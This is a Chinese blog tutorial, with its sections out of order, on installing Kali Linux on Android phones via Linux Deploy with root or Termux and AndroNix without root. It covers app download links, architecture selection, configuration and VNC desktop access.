src="https://i.loli.net/2020/01/10/qOxFWGkQAj1KtYy.png" alt="Screenshot_20191219-142733.png"></p><p><strong>LXDE</strong>:</p><p><img src="https://i.loli.net/2020/01/10/MU7LJfmBtT2YF4s.png" alt="Screenshot_20191219-143142.png"></p><p><strong>Xfce</strong>:</p><p><img src="https://i.loli.net/2020/01/10/OEijXJ1sfHq8z6m.png" alt="Screenshot_20191219-144642.png"></p><p><strong>MATE</strong>:</p><p><img src="https://i.loli.net/2020/01/10/FrPQCwteOlbcX7f.png" alt="Screenshot_20191219-144052.png"></p><p>配置结束，这里再提一下上面说过的 <strong>图形子系统</strong> 的另外两个选项，仅供参考；首先是 X11，熟悉 Linux 的应该了解这个选项，物理机（或虚拟机）安装的 Linux 桌面系统一般都是使用的 X11 的图形服务，选上后进入 <strong>图形界面设置</strong> 后是以下选项：</p><p><img src="https://i.loli.net/2019/12/25/2LqmBMkVwlF1KRd.jpg" alt="Screen-20191211-143946.png"></p><p>不了解的可以按上图配置，另外，使用改选项需要安装图中所说的 <strong>Xserver XSDL</strong> 这个软件，可以去市场下载，或者使用下面的链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1AuC09-HzT9ZWEwBzV7dRxg提取码: swx5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装好后不用特意打开它，Linux 系统启动时它会被自动打开，运行（需等待一段时间，不要点屏幕）截图如下：</p><p><img src="https://i.loli.net/2020/01/10/wkNlY5VLPhMIQyZ.png" alt="Screenshot_20191219-144618.png"></p><p><img src="https://i.loli.net/2020/01/10/1ojkCrZ6fUTcHLW.png" alt="Screenshot_20191219-144622.png"></p><p><img src="https://i.loli.net/2020/01/10/g42DyO57vkTiEtB.png" alt="Screenshot_20191219-144625.png"></p><p>如果 <strong>图形子系统</strong> 选择 framebuffer 的话，<strong>图形界面设置</strong> 选项如下：</p><p><img src="https://i.loli.net/2019/12/25/QUnOXAF5TzGf2MC.jpg" alt="Screen-20191211-144016.png"></p><p>设置也是默认不变，只不过由于这种图形显示技术比较特殊（古老），笔者尝试并未成功，手机还多次卡死 -_-，所以保守派就不要轻易尝试了，自担风险；</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>上面进行的配置会被保存到一个配置文件中，点击 Deploy 软件主界面左上角的菜单按钮，选择第一 <strong>配置文件</strong> 选项即可对配置文件经行修改，这是默认的配置：</p><p><img src="https://i.loli.net/2020/01/10/M3HxFY5fhbDuSLK.png" alt="Screenshot_20191217-221200.png"></p><p>右上角的三个按钮分别是<strong>新建、重命名、删除</strong>，例如对当前配置文件重命名：</p><p><img src="https://i.loli.net/2020/01/10/zaS1QvMytCKNiEP.png" alt="Screenshot_20191217-221220.png"></p><p>或者新建一个：</p><p><img src="https://i.loli.net/2020/01/10/GIVLhMUurbTXCWo.png" alt="Screenshot_20191217-221301.png"></p><p>使用不同的配置来选择不同的系统，就可以实现一机安装多 linux 系统（手机存储足够前提下）；</p><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>配置完毕，接下来就是安装系统了；首先回到软件主界面，点击右上角的菜单按钮：</p><p><img src="https://i.loli.net/2020/01/10/mEPJrihunyjl4Bv.png" alt="Screenshot_20191219-135609.png"></p><p>然后点击第一个 <strong>安装</strong> 按钮，然后弹出窗口中点 OK 确定：</p><p><img src="https://i.loli.net/2020/01/10/vjk4wfpFsbhrltU.png" alt="Screenshot_20191219-135646.png"></p><p>随后软件就开始 Linux 系统的安装了，主界面会不断输出一些信息：</p><p><img src="https://i.loli.net/2020/01/10/uk61aFgYjhwyAZp.png" alt="Screenshot_20191219-135653.png"></p><p><img src="https://i.loli.net/2020/01/10/Zmi9bSj7UK4rDGz.png" alt="Screenshot_20191219-140612.png"></p><p>操作系统较大，下载安装时间较长，一般用时在半小时左右，网速好的话会快一点；当输出信息如下图的最后一行时，则表示安装完成：</p><p><img src="https://i.loli.net/2020/01/10/ypKt6Uj4ZQsfzF9.png" alt="Screenshot_20191219-141624.png"></p><p>然后下一步本应是点击右上角菜单的配置按钮，但是这样会出现像下面这个的 <strong>问题</strong>：</p><p><img src="https://i.loli.net/2020/01/10/uxMU8B2Gidqyta3.png" alt="Screenshot_20191219-141816.png"></p><p>也就是输出一堆 <code>skip</code>，这是因为在没有关闭系统的情况下进行配置，会使得系统不能正常配置，所以需要先点击底部菜单的停止按钮（以后出现 skip 输出数量较多时也这样操作）：</p><p><img src="https://i.loli.net/2020/01/10/XsbreM7zivPBC5u.png" alt="Screenshot_20191219-141821.png"></p><p>然后点击确认，最后输出 <code>&lt;&lt;&lt; stop</code> 则表示停止成功：</p><p><img src="https://i.loli.net/2020/01/10/dAUGXBy3qizwSkY.png" alt="Screenshot_20191219-141827.png"></p><p>这里再点击右上角菜单的配置选项，也需要等待一段时间：</p><p><img src="https://i.loli.net/2020/01/10/pUOhLMAno4IfGx3.png" alt="Screenshot_20191219-141718.png"></p><p>配置结束后，点击启动按钮启动系统：</p><p><img src="https://i.loli.net/2020/01/10/w9ob3VgdjfUpen4.png" alt="Screenshot_20191219-141724.png"></p><p>启动成功，都是 <code>done</code> 则表示正常启动，若 <code>skip</code> 较多则尝试停止后再启动（下图的 /dev/shm skip 可以不用管）：</p><p><img src="https://i.loli.net/2020/01/10/21oFdBKwIvzcY6G.png" alt="Screenshot_20191219-141837.png"></p><h2 id="进入系统"><a href="#进入系统" class="headerlink" title="进入系统"></a>进入系统</h2><p>Linux 系统启动完毕，接下来就是进入图形桌面环境，当然，由于之前开启了 SSH 服务，所以也可以使用之前下载的 Terminal 终端软件进入 shell 环境，这里由于之前选择 VNC 作为图形子系统来配置的，所以这里就用 <strong>VNC Viewer</strong> 这个软件来进入图形桌面；</p><p>打开 <code>VNC Viewer</code> 这个软件，进入主界面：</p><p><img src="https://i.loli.net/2020/01/10/oTf7nhzrs2AUtd3.png" alt="Screenshot_20191219-142011.png"></p><p>点击右下角的加号添加要连接的对象，这个软件本来是用于连接所有开有 VNC 服务的服务器的，由于我们把 Linux 系统安装在手机（即本地），所以地址填写本地地址：<code>127.0.0.1</code>，也可以写 <code>localhost</code>，一个意思，下面一行的名字随便写一个：</p><p><img src="https://i.loli.net/2020/01/10/L74fsb38WMKGpnv.png" alt="Screenshot_20191219-142342.png"></p><p>然后点击 <code>create</code> 创建连接，进入如下界面：</p><p><img src="https://i.loli.net/2020/01/10/DynFJSlz1OisZ2p.png" alt="Screenshot_20200110-180055.png"></p><p>需要注意的只有 <code>view only</code> 这个不要选上，就是字面意思，只读模式；点击 <code>CONNECT</code> 进行连接，会提示输入密码：</p><p><img src="https://i.loli.net/2020/01/10/D1IsqdgmpH9MeEl.png" alt="Screenshot_20191219-142059.png"></p><p>密码就是之前在配置里面设置的用户密码，当时设置的是 <code>test</code>（之后记得自己修改密码），填上去，然后把记住密码勾上，再点击右上角的 <code>CONTINUE</code>：</p><p><img src="https://i.loli.net/2020/01/10/BwMF9H6pqNWRACK.png" alt="Screenshot_20191219-142048.png"></p><p>后面出现的安全提示不用管，取消勾选 <code>warn me every time</code>，再点击右上角的 <code>OK</code> 就可以进入系统了：</p><p><img src="https://i.loli.net/2020/01/10/KB3ZvfekwPJytSL.png" alt="Screenshot_20191219-142109.png"></p><p>初次使用软件进入有个教程，跟着做完就行了，忘记了按钮的意思就点右数第二个问号按钮查看就行了，下面再给出几张横屏的特写：</p><p><img src="https://i.loli.net/2020/01/10/olkIJuR4PdpQFUN.png" alt="Screenshot_20191219-142136.png"></p><p><img src="https://i.loli.net/2020/01/10/Da96phJmbvLtsSR.png" alt="Screenshot_20191219-142224.png"></p><p><img src="https://i.loli.net/2020/01/10/qVK8mrpiF2vOQwa.png" alt="Screenshot_20191219-142237.png"></p><p>这里再提供一款输入法软件：<strong>Hacker’s Keyboard</strong>，翻译过来是黑客键盘，听着霸气，其实就是增加了计算机键盘中的 <strong>Ctrl, Shift, Tab, Alt</strong> 等键，因为常见手机输入法中不存在这几个键，在使用 Kali 系统时可以提供一些便利，自行搜索下载或使用以下链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1iPgSBmNYy9xzHfJg2aoaEg提取码: ydah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也附上两张特写：</p><p><img src="https://i.loli.net/2020/01/10/1sBCbZJdctWaVSm.png" alt="Screenshot_20200110-214651.png"></p><p>默认是横屏才出现特殊按键，可以自行在设置中修改：</p><p><img src="https://i.loli.net/2020/01/10/ung17xLOseVFR4J.png" alt="Screenshot_20200110-214733.png"></p><h2 id="关闭系统"><a href="#关闭系统" class="headerlink" title="关闭系统"></a>关闭系统</h2><p>不再使用系统后点右上角的叉号断开连接：</p><p><img src="https://i.loli.net/2020/01/10/Cr6v53zJu7acj1O.png" alt="Screenshot_20191219-142251.png"></p><p>回到主界面也会保存系统的快照，下次直接点击就能进去了：</p><p><img src="https://i.loli.net/2020/01/10/CbUSh82DgBOwois.png" alt="Screenshot_20191219-142352.png"></p><p>断开连接不代表系统关闭了，还要回到 Deploy 这个软件，点击底部的停止按钮：</p><p><img src="https://i.loli.net/2020/01/10/NHc1pLEYAsCq5tG.png" alt="Screenshot_20191219-142407.png"></p><p>如下图，则表示系统成功关闭了：</p><p><img src="https://i.loli.net/2020/01/10/Sx5uXqYNnzKWCbv.png" alt="Screenshot_20191219-142416.png"></p><p>下次要启动系统，就点击启动按钮，再用 VNC Viewer 连接就行了，切换不同的 Linux 系统，只需要切换到对应的配置文件就行了，<strong>注意</strong> 每次切换或修改配置，都需要点击右上角的 <strong>配置</strong> 按钮进行重新配置，只有在安装新系统时才需要点击 <strong>安装</strong> 按钮；</p><p>至此关于 root 环境下使用 Deploy 安装 Kali 系统的教程就结束了，关于 Deploy 中未提到的其他菜单功能，可以自行探索；</p><h1 id="非-ROOT-环境"><a href="#非-ROOT-环境" class="headerlink" title="非 ROOT 环境"></a>非 ROOT 环境</h1><p>当然，除去 root 玩家，总会存在那么一些手机厂商，让自家产品百试不得其 ROOT，让技术用户们又爱又恨-_-，所以这里也准备了非 ROOT 环境下的备选方案，当然，比起 ROOT 来说，确实会阉割部分功能，但主要功能都能用，所以建议能 ROOT 就不要退而求其次；</p><h2 id="主要软件"><a href="#主要软件" class="headerlink" title="主要软件"></a>主要软件</h2><h3 id="Termux"><a href="#Termux" class="headerlink" title="Termux"></a>Termux</h3><p>这是该方法的主角，这个软件类似于在手机中搭建一个 Linux 虚拟机，可以执行一些常用的 Linux 命令，与之前说的 <code>Terminal</code> 这个终端软件主要的区别就是该软件可以安装第三方软件包，就是熟悉的 <code>apt</code> 系列命令，很方便，因此功能也较为强大；可以在应用市场搜索下载，或者使用下面的链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1z1blrlhPxUcsbRlmGTkAYw取码: stye<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="AndroNix"><a href="#AndroNix" class="headerlink" title="AndroNix"></a>AndroNix</h3><p>这个软件用于提供常见 Linux 发行版本系统的下载，其实用过后发现就是提供系统的下载链接，然后跳转到 Termux 进行下载和安装，搜索下载或使用链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;177VOddzfaCXVoHb_duK5bA提取码: 7k65<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="安装系统-1"><a href="#安装系统-1" class="headerlink" title="安装系统"></a>安装系统</h2><p>首先安装 <strong>Termux</strong> 软件然后打开，会进入以下界面：</p><p><img src="https://i.loli.net/2020/01/10/votJUF5ald23g7s.jpg" alt="Screenshot_20191211_184512_com.termux.jpg"></p><p>它是一个简单的 shell，可以运行一些常用命令，自行探究；</p><p>然后安装并打开 <strong>AndroNix</strong> 软件，主界面如下：</p><p><img src="https://i.loli.net/2020/01/10/PYlSerdC79btJkQ.jpg" alt="Screenshot_20191211_184532_studio.com.techriz.andronix.jpg"></p><p>这里还是以安装 Kali 系统为例，那么我们点击右上那个熟悉的 Kali 系统图标，进入以下界面，点击安装按钮：</p><p><img src="https://i.loli.net/2020/01/10/sM2C6wr4OnXA5zW.jpg" alt="Screenshot_20191211_184539_studio.com.techriz.andronix.jpg"></p><p>按照指示的步骤进行，先点击复制，命令会被复制到系统粘贴板：</p><p><img src="https://i.loli.net/2020/01/10/v6rFTyuk4iDEMCG.jpg" alt="Screenshot_20191211_184556_studio.com.techriz.andronix.jpg"></p><p>然后我们切换到 <strong>Termux</strong> 这个软件，长按粘贴刚才复制的代码，内容如下：</p><p><img src="https://i.loli.net/2020/01/10/fBbxKvSH6VunLcl.jpg" alt="Screenshot_20191211_184637_com.termux.jpg"></p><p>然后按下回车后进行系统的下载和安装，同样需要一段时间；完成后，会在当前目录下生成几个新文件，如下图：</p><p><img src="https://i.loli.net/2020/01/10/qtN2SjwQWEGyBeK.jpg" alt="Screenshot_20191211_184702_com.termux.jpg"></p><p>目录下的 <code>start-kali.sh</code> 文件就是我们安装的 Kali 系统的启动文件，所以我们输入命令 <code>./start-kali.sh</code> 启动系统：</p><p><img src="https://i.loli.net/2020/01/10/qOC3iPbZTDv8UAu.jpg" alt="Screenshot_20191211_184724_com.termux.jpg"></p><p>到这里我们的系统算是安装成功了；</p><h2 id="安装图形桌面"><a href="#安装图形桌面" class="headerlink" title="安装图形桌面"></a>安装图形桌面</h2><p>目前安装的 Kali 系统只能 shell 进行访问，接下来安装我们熟悉的图形桌面环境，所以我们手机切换回 <strong>AndroNix</strong> 这个软件，执行第二步，即择桌面系统，和之前一样，我们点击 <strong>XFCE</strong>：</p><p><img src="https://i.loli.net/2020/01/10/TZfQtgSDGAqc8nk.jpg" alt="Screenshot_20191211_184611_studio.com.techriz.andronix.jpg"></p><p>这里同样是把代码复制到了系统粘贴板，需要切换到 Termux 并粘贴代码；需要 <strong>注意</strong> 的是，官方文件似乎没有描述清楚，这里是要再启动后的 Kali 系统环境下粘贴代码以安装图形桌面，也就是运行 <code>./start-kali.sh</code> 后再粘贴运行代码，而不是在 Termux 的默认环境下粘贴运行，如下图：</p><p><img src="https://i.loli.net/2020/01/10/3ZGmaAPQJqF5YDr.jpg" alt="Screenshot_20191211_184838_com.termux.jpg"></p><p>安装完后会提示设置连接密码，为了之后使用 <strong>VNC Viewer</strong> 进行连接：</p><p><img src="https://i.loli.net/2020/01/10/HTbMKen9raltiUo.jpg" alt="Screenshot_20191211_190028_com.termux.jpg"></p><p>再次输入以确定：</p><p><img src="https://i.loli.net/2020/01/10/9tHcKDs6FzkSw7n.jpg" alt="Screenshot_20191211_190036_com.termux.jpg"></p><p>然后会提示是否设置一个 view-only（只读模式）密码，这里我们不设置，输入 <strong>n</strong>：</p><p><img src="https://i.loli.net/2020/01/10/4W3IBVOPYpgmblE.jpg" alt="Screenshot_20191211_190046_com.termux.jpg"></p><p>然后就配置完成，要访问 Kali 图形桌面就需要先启动 VNC 服务，启动服务的命令为 <code>vncserver-start</code>，停止的命令为 <code>vncserver-stop</code>，如下图；</p><p><img src="https://i.loli.net/2020/01/10/RX1yuBlsUMCh73Y.jpg" alt="Screenshot_20191211_190113_com.termux.jpg"></p><p>会发现这两个命令类似 Deploy 中的启动和停止按钮，只不过它是同时启动系统和 vnc 服务罢了；接下来就输入命令启动 Kali 系统的 VNC 服务，会输出以下信息：</p><p><img src="https://i.loli.net/2020/01/10/LGIbZfCMX1gy6Nz.jpg" alt="Screenshot_20191211_190123_com.termux.jpg"></p><p>到这里服务就启动成功了，接下来就是和之前一样，使用  <strong>VNC Viewer</strong> 这个软件来连接图形桌面环境，新建一个连接：</p><p><img src="https://i.loli.net/2020/01/10/5fL4Dvj9qzm7GOJ.jpg" alt="Screenshot_20191211_191617_com.realvnc.viewer.android.jpg"></p><p>这里也是和之前唯一 <strong>不同</strong> 之处，即 Deploy 默认开启的 vnc 服务端口是 <strong>5900</strong>，同时 VNC Viewer 的默认端口也是 <strong>5900</strong>，所以之前只需要输入 <code>127.0.0.1</code> 就行了，但是 <code>vncserver-start</code> 开启服务的端口是 <strong>5901</strong> 起步，随开启数量而递增，所以在配置地址时需要指定端口，即地址设为：<code>127.0.0.1:5901</code>；</p><p>后面的步骤就和之前大致相同了：</p><p><img src="https://i.loli.net/2020/01/10/5OGVJlPAbZDNL1z.jpg" alt="Screenshot_20191211_191625_com.realvnc.viewer.android.jpg"></p><p>连接密码就是之前设置的密码：</p><p><img src="https://i.loli.net/2020/01/10/9Yw6NTiFbIyjpk2.jpg" alt="Screenshot_20191211_191630_com.realvnc.viewer.android.jpg"></p><p>来几张特写：</p><p><img src="https://i.loli.net/2020/01/10/RGpEbdFz7lwAqUM.jpg" alt="Screenshot_20191211_191646_com.realvnc.viewer.android.jpg"></p><p><img src="https://i.loli.net/2020/01/10/jC1ymP9ObQBAJhD.jpg" alt="Screenshot_20191211_191707_com.realvnc.viewer.android.jpg"></p><p><img src="https://i.loli.net/2020/01/10/iyLmzphVIFYOZQu.jpg" alt="Screenshot_20191211_191726_com.realvnc.viewer.android.jpg"></p><h2 id="关闭系统-1"><a href="#关闭系统-1" class="headerlink" title="关闭系统"></a>关闭系统</h2><p>停止使用系统后，先断开连接：</p><p><img src="https://i.loli.net/2020/01/10/VcgAauCM5p8yFin.jpg" alt="Screenshot_20191211_191747_com.realvnc.viewer.android.jpg"></p><p>然后回到 <strong>Termux</strong> 软件，输入 <code>vncserver-stop</code> 命令停止 vnc 服务，输入 <code>exit</code> 注销登录 Kali系统，再按 CTRL + z 返回 Termux 环境（CTRL 在软件底部菜单栏）：</p><p><img src="https://i.loli.net/2020/01/10/rsDoOkc2Yn6u3SQ.jpg" alt="Screenshot_20191211_191856_com.termux.jpg"></p><p>到这里非 ROOT 条件下的 Kali 系统安装教程也结束了，想要安装其它发行版本的 linux 系统可以用类似的方法自行摸索，不做赘述；另外，从上面安装 Kali 系统的命令中也能发现，系统镜像并不是官方源，而是为了适应在非 ROOT 手机中运行的“定制版本”，当然常用功能健在，只是某些部分有所限制，可以之后自行体会；<br>–&gt;</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写有<a href="https://knightyun.github.io/2018/04/15/kali-linux-install">文章</a>介绍过关于 Kali Linux 系统安装的详细教程，不过是在电脑端真机或虚拟机中的安装步骤，那么作为平时使用最多并且能方便携带的智能手机端，是否有方法或技术来实现安装呢？还确实有，这也是该文章的主旨。我们都知道安卓系统本身就是 Linux 系统的一个发行版本，所以在技术理论上是有可行性的，并且目前还确实有人实现了，至于苹果手机（iOS系统）端，笔者没做研究，就不做阐述了，有兴趣可以自行了解。那么现在就来介绍一下如何在手机端（安卓系统）进行 Linux 系统（包括但不限于 Kali）的安装。</p><h1 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a>原理概述</h1><p>其实实现该技术的原理并不复杂，由于安卓是 Linux 系统的一个分支，所以和其他主流 Linux 操作系统之间有着很大的共同性，比如很多 shell 指令代码都能使用。另外，Linux 命令中有一个叫 <code>chroot</code> 的，大概的作用就是在指定的根目录下运行命令，通俗讲，类似于 Windows 系统中的安全沙箱的概念，即一个安全的隔离环境，这也是该命令的目的所在。因此，既然能在该指定目录下运行一些命令，那么要是把整个操作系统的命令、目录以及文件都装进去，那它不就成了一个嵌入的系统了吗，这里又有些类似虚拟机的概念。</p><p>当然，要在手机中执行这些命令就免不了要手机获得 <strong>root 权限</strong>，即对手机进行 ROOT；不用担心，这只是其中一个办法，本文也会介绍另一种不需要 ROOT 手机的方法。总结一下二者的原理：ROOT 操作相当于直接在手机安卓系统中挂载一个 Linux 系统（例如 Kali），而非 ROOT 方法就有些绕，类似于在安卓系统中通过软件挂载一个能执行一些命令的环境（当然这样会有很多权限限制，毕竟没有 ROOT），然后在这个环境中就可以再挂载想要的 Linux 操作系统了，由于这个系统在一个虚拟的环境中，所以就不存在权限的问题了（得不到真实的权限，给与虚拟的权限还是做得到的→_→，哈哈哈）。通俗讲就是，ROOT 使用的是真机中的虚拟机，而非 ROOT 使用的是真机中的虚拟机中的虚拟机（感觉绕可以再读几遍）。</p><p>下面是安装系统的两种方法：</p><h1 id="ROOT-环境"><a href="#ROOT-环境" class="headerlink" title="ROOT 环境"></a>ROOT 环境</h1><h2 id="主要软件-1"><a href="#主要软件-1" class="headerlink" title="主要软件"></a>主要软件</h2><h3 id="Linux-Deploy"><a href="#Linux-Deploy" class="headerlink" title="Linux Deploy"></a>Linux Deploy</h3><p>有 root 权限的话，安装就比较简单，并且安装的系统使用也比较流畅，毕竟是直接与真机硬件交互的，然后就先介绍一下该方法的主角：<strong>Linux Deploy</strong>，它是一个安卓软件，图标是一个小企鹅，在各大应用市场应该都能搜得到，找不到的话可以在这里下载：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;16OKQc2ru5E7yOTliDzNuUw提取码: vi7w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="VNC-Viewer-1"><a href="#VNC-Viewer-1" class="headerlink" title="VNC Viewer"></a>VNC Viewer</h3><p>另外需要一款远程连接软件（这里使用 VNC Viewer）来显示系统界面，因为系统安装到手机中后，一般不会直接把桌面和窗口输出到手机的主屏幕，所以需要远程桌面软件连接到该系统来进行显示，否者就是使用终端连接（如 SSH）的纯命令行操作，VNC Viewer 软件也能在各大市场搜到，或者从下面的链接下载：</p><pre class="line-numbers language-none"><code class="language-none">链接:https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1cjBii8MWSAqsM-9urW658Q提取码:h7si<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Terminal-1"><a href="#Terminal-1" class="headerlink" title="Terminal"></a>Terminal</h3><p>一款安卓的终端软件（非必需），可以在手机上执行一些 Linux 命令，也可以使用它提供的 SSH 连接到之后安装的系统，依然，市场搜不到可以在下面的链接下载：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1ZOUjbmW0MLjbMunAGecGfA提取码: 5jhj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下面是 Deploy 软件主界面的截图：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTEvN2ltWnhMZk9vV2xLUTlVLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-132447.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTEvdmhlU0RveWpNcXdJZno1LmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-132433.png"></p><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>在安装系统前，需要进行一些配置，顺便解释一下各个配置选项，先点击软件主页的配置按钮（上图右下角）进入配置页面：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvd0hodUlkU1VlVG1KRXJMLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-142939.png"></p><p><strong>发行版本</strong>，点进去选择想要的 Linux 发行版，这里以 Kali 为例：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvUjdnOU9IY1hrS3lkUUZNLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-142948.png"></p><p><strong>架构</strong>，点进去会出来这么几个选项：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvbmlSSU1DUEd1aGY5THlFLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143014.png"></p><p>这里简单解释一下选项中的五种架构，前三个 <strong>armel, armhf, arm64</strong> 都是 ARM 处理器（常见的手机处理器品牌，类似于电脑的 Intel）的几个版本，区别如下：</p><ul><li><p>armel：（arm eabi little endian）也即softfp，用fpu计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算；</p></li><li><p>armhf：（arm hard float）也即hard，用fpu计算，传参数用fpu中的浮点寄存器传，省去了转换性能最好，但是中断负荷高；</p></li><li><p>arm64：64位的arm默认就是hard float的，因此不需要hf的后缀；</p><p>至于第四个 <strong>i386</strong> 是 Intel 的 32 位处理器架构，最后一个 <strong>amd64</strong> 则是 AMD（一家类似 Intel 的处理器公司）的 64 位处理器架构；</p></li></ul><p>那么要如何判断自己的手机是哪种架构呢？方法很多，可以使用上面提到的 Terminal 软件，通过 <code>cat /proc/cpuinfo</code> 命令查看手机的 CPU 架构信息，如图所示：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvclo0bXRndlh1a2VuTXdULmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-142738.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvRXBncURKR1NUa1pCZDV5LmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-142830.png"></p><p>这一步查询可能会看到诸如 <strong>ARMv8, ARMv7, Cortex-A, AArch64, AArch32</strong> 等字眼，简单解释一下，ARMv7 和 ARMv8 是两个 ARM 的版本，v7 版本是 <strong>32位</strong> 的，v8 是 ARM 公司的第一款 <strong>64位</strong> 处理器架构，并且从 v7 版本后开始变成了 Cortex 架构，包括 Cortex-A、Cortex-R、C ortex-M 系列，其中的 Cortex-A 系列就是常见的只能手机处理器，另外两个多应用于车载系统，嵌入式微控制器等领域；ARMv8-A 有两种执行状态： <strong>AArch64</strong> 和 <strong>AArch32</strong>（后者是为了兼容以前的32bit的程序），AArch64执行A64指令，使用 64bit 的通用寄存器；AArch32 执行 A32/T32 指令，使用 32bit 的通用寄存器；</p><p>所以可以简单的理解为 ARMv7 是 32位，ARMv8 是 64位的；如果不想用终端和命令查看，也可以使用软件直接查看，比如著名的 <strong>AIDA64</strong>，可以在市场搜索下载，或者使用链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1wvUc0VhWyhb-QGbkd9LylQ提取码: mqby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开后点击中央处理器模块，内核架构信息里就是要找的架构类型，这里的是 ARMv8 的，如下图：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvSTVEUG4xUnZUc0tGazhqLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191212_101530_com_finalwire_aida64.jpg"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvdUxsQzQ5VnBLU0FiUXN6LmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191212_101534_com.finalwire.aida64.jpg"></p><p>因此我们在配置里选择 <strong>ARM64</strong>；</p><p><strong>发行版的版本</strong>，之前选择 Kali 的话就默认只有一个 <strong>kali-rolling</strong> 版本，其它系统的话自行决定：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvYVg0OE1lUFpEdldyQWNLLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143025.png"></p><p><strong>源地址</strong>，就是软件从哪里去获取系统镜像等相关文件，这里用默认的就行：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvTnlmTVFsWWRuajhEa1dLLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143151.png"></p><p>当然官方源的是网站是国外的，速度可能有点慢，可以选择使用国内的源，比如阿里云和中科大等，详细介绍可以参考这篇 <a href="https://knightyun.github.io/2018/04/21/linux-sources-list">文章</a>，比如使用阿里云的就把地址改为以下内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>安装类型</strong>，一般就选择默认的<strong>镜像文件</strong>类型，方便安全，至于其它类型就是它们字面上的意思，所以可能会和系统出现冲突：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvV0FCT2JjaUZvUWtFOXBOLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143213.png"></p><p><strong>安装路径</strong>，就是决定把镜像文件安装到哪，并且以什么名字命名，默认的值使用了环境变量，测试似乎存在问题，所以改一下，比如我们安装到内置存储的根目录，以 <strong>kali.img</strong> 命名，就是 <code>/sdcard/kali.img</code>，注意镜像文件的后缀 <code>.img</code> 是固定不变的：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMTIvMTUvUGY4NU15ek50aXJWVGQyLmpwZw?x-oss-process=image/format,png" alt="Screen-20191211-143322.png"></p><p><strong>镜像大小</strong>，默认是 0，即自动分配大小，不过经测试，它似乎没有想象中那么<strong>自动</strong> -_-，所以我们就自己设一个值，注意单位是 MB，并且这个值就是安装的系统能用的总存储空间，因此可以稍微设置大一点，具体值随便填，这里的 8096 就是 8GB 左右（1024MB = 1GB）：</p><p><img 